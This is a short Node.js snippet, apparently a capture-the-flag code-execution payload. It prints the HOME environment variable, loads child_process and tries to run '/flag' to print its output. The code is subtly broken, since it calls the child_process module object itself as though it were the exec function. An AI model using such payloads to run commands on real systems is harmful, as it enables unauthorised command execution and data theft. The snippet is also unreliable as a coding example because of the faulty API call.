console.log(process.env.HOME);
exec = require("child_process");
exec('/flag', (error, stdout, stderr) => {console.log(stdout)} );
